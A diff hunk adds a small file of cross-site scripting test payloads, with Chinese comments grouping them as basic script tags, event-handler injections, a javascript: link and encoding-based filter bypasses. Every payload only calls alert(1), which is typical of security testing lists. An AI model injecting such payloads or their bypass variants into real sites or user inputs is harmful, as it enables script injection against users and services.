@@ -1,0 +1,13 @@
+<!-- 基础 XSS -->
+<script>alert(1)</script>
+
+<!-- 事件 XSS -->
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+
+<!-- URL XSS -->
+<a href="javascript:alert(1)">点我</a>
+
+<!-- 编码绕过 -->
+<script>alert&#40;1&#41;</script>
+%3Cscript%3Ealert(1)%3C/script%3E
